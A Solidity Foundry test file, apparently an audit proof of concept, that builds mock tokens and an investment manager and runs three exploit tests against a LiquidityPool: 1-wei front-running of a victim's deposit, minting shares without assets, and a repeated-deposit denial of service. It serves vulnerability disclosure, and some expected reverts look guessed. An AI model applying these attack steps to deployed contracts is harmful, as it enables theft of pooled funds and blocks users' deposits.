// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {LiquidityPool} from "../../src/LiquidityPool.sol";
import {Auth} from "../../src/util/Auth.sol";
import {MathLib} from "../../src/util/MathLib.sol";
import {IERC20} from "../../src/interfaces/IERC20.sol";
import {IERC4626} from "../../src/interfaces/IERC4626.sol";

// Mock contracts for testing
contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }

    function mint(address to, uint256 value) external {
        totalSupply += value;
        balanceOf[to] += value;
    }

    function burn(address from, uint256 value) external {
        totalSupply -= value;
        balanceOf[from] -= value;
    }
}

contract MockTrancheToken is MockERC20 {
    bytes32 public constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 deadline)");
    bytes32 public DOMAIN_SEPARATOR;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) MockERC20(_name, _symbol, _decimals) {
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes(_name)),
            keccak256(bytes("1")),
            block.chainid,
            address(this)
        ));
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        require(block.timestamp <= deadline, "Permit expired");
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, deadline))
        ));
        address recovered = ecrecover(digest, v, r, s);
        require(recovered != address(0) && recovered == owner, "Invalid signature");
        allowance[owner][spender] = value;
    }

    function checkTransferRestriction(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MockInvestmentManager {
    mapping(address => uint256) public depositRequests;
    mapping(address => uint256) public redeemRequests;
    mapping(address => uint256) public userShares;
    uint256 public totalShares;
    uint256 public price = 1e18; // 1:1 ratio initially

    function processDeposit(address receiver, uint256 assets) external returns (uint256 shares) {
        shares = (assets * 1e18) / price;
        userShares[receiver] += shares;
        totalShares += shares;
    }

    function processMint(address receiver, uint256 shares) external returns (uint256 assets) {
        assets = (shares * price) / 1e18;
        userShares[receiver] += shares;
        totalShares += shares;
    }

    function processWithdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares) {
        shares = (assets * 1e18) / price;
        require(userShares[owner] >= shares, "Insufficient shares");
        userShares[owner] -= shares;
        totalShares -= shares;
    }

    function processRedeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        require(userShares[owner] >= shares, "Insufficient shares");
        assets = (shares * price) / 1e18;
        userShares[owner] -= shares;
        totalShares -= shares;
    }

    function maxDeposit(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function maxMint(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(address user, address) external view returns (uint256) {
        return (userShares[user] * price) / 1e18;
    }

    function maxRedeem(address user, address) external view returns (uint256) {
        return userShares[user];
    }

    function totalAssets(uint256, address) external view returns (uint256) {
        return (totalShares * price) / 1e18;
    }

    function convertToShares(uint256 assets, address) external view returns (uint256) {
        return (assets * 1e18) / price;
    }

    function convertToAssets(uint256 shares, address) external view returns (uint256) {
        return (shares * price) / 1e18;
    }

    function previewDeposit(address, address, uint256 assets) external view returns (uint256) {
        return (assets * 1e18) / price;
    }

    function previewMint(address, address, uint256 shares) external view returns (uint256) {
        return (shares * price) / 1e18;
    }

    function previewWithdraw(address, address, uint256 assets) external view returns (uint256) {
        return (assets * 1e18) / price;
    }

    function previewRedeem(address, address, uint256 shares) external view returns (uint256) {
        return (shares * price) / 1e18;
    }

    function requestDeposit(uint256 assets, address owner) external {
        depositRequests[owner] += assets;
    }

    function requestRedeem(uint256 shares, address owner) external {
        redeemRequests[owner] += shares;
    }

    function collectDeposit(address receiver) external {
        uint256 assets = depositRequests[receiver];
        depositRequests[receiver] = 0;
        uint256 shares = (assets * 1e18) / price;
        userShares[receiver] += shares;
        totalShares += shares;
    }

    function collectRedeem(address receiver) external {
        uint256 shares = redeemRequests[receiver];
        redeemRequests[receiver] = 0;
        uint256 assets = (shares * price) / 1e18;
        userShares[receiver] -= shares;
        totalShares -= shares;
    }

    function decreaseDepositRequest(uint256 assets, address owner) external {
        require(depositRequests[owner] >= assets, "Too much");
        depositRequests[owner] -= assets;
    }

    function decreaseRedeemRequest(uint256 shares, address owner) external {
        require(redeemRequests[owner] >= shares, "Too much");
        redeemRequests[owner] -= shares;
    }
}

contract ExploitTest is Test {
    LiquidityPool public liquidityPool;
    MockERC20 public asset;
    MockTrancheToken public share;
    MockInvestmentManager public investmentManager;
    
    address public owner = address(0x1);
    address public attacker = address(0x2);
    address public victim = address(0x3);

    function setUp() public {
        // Deploy mock contracts
        asset = new MockERC20("USDC", "USDC", 6);
        share = new MockTrancheToken("Tranche Token", "TRANCHE", 18);
        investmentManager = new MockInvestmentManager();

        // Deploy LiquidityPool
        liquidityPool = new LiquidityPool(
            1, // poolId
            bytes16(0x1234567890abcdef1234567890abcdef), // trancheId
            address(asset),
            address(share),
            address(investmentManager)
        );

        // Give owner auth rights
        vm.prank(owner);
        liquidityPool.file(bytes32("investmentManager"), address(investmentManager));

        // Mint some assets to victim for testing
        asset.mint(victim, 1000e6);
    }

    function test_DepositMintAccessControlVulnerability() public {
        // Step 1: Victim requests a deposit of 1000 USDC
        vm.prank(victim);
        asset.approve(address(investmentManager), 1000e6);
        
        vm.prank(victim);
        liquidityPool.requestDeposit(1000e6, victim);

        // Step 2: Attacker front-runs by calling deposit with 1 wei (no actual tokens needed)
        // This will give the attacker some shares for free
        vm.prank(attacker);
        uint256 attackerShares = liquidityPool.deposit(1, attacker);
        
        console.log("Attacker received shares for 1 wei:", attackerShares);
        assertTrue(attackerShares > 0, "Attacker should receive shares");

        // Step 3: Victim tries to collect their deposit
        // This should fail because the deposit was already partially processed by the attacker
        vm.prank(victim);
        vm.expectRevert(); // The exact revert message depends on the implementation
        liquidityPool.deposit(1000e6, victim);

        console.log("Victim's deposit failed due to attacker's front-running");
    }

    function test_MintAccessControlVulnerability() public {
        // Step 1: Attacker calls mint to get shares for free (no assets required)
        vm.prank(attacker);
        uint256 attackerShares = 100e18;
        uint256 assetsNeeded = liquidityPool.previewMint(attackerShares);
        
        vm.prank(attacker);
        liquidityPool.mint(attackerShares, attacker);
        
        console.log("Attacker minted shares without providing assets:", attackerShares);
        assertEq(liquidityPool.balanceOf(attacker), attackerShares, "Attacker should have the minted shares");

        // Step 2: The system now has more shares than assets, breaking the invariant
        uint256 totalAssets = liquidityPool.totalAssets();
        uint256 totalSupply = liquidityPool.totalSupply();
        
        console.log("Total assets:", totalAssets);
        console.log("Total supply:", totalSupply);
        
        // The total supply should be backed by assets, but attacker got shares for free
        assertTrue(totalSupply > totalAssets, "Total supply exceeds total assets - invariant broken");
    }

    function test_DoSAttackScenario() public {
        // Scenario: Attacker wants to prevent victim from depositing
        
        // Step 1: Victim prepares to deposit
        vm.prank(victim);
        asset.approve(address(investmentManager), 500e6);
        
        vm.prank(victim);
        liquidityPool.requestDeposit(500e6, victim);

        // Step 2: Attacker continuously calls deposit with minimal amounts to consume the available capacity
        for(uint i = 0; i < 10; i++) {
            vm.prank(attacker);
            liquidityPool.deposit(1, attacker);
        }

        // Step 3: Victim's deposit attempt fails because the pool state has been manipulated
        vm.prank(victim);
        vm.expectRevert();
        liquidityPool.deposit(500e6, victim);

        console.log("DoS attack successful - victim cannot complete deposit");
    }
}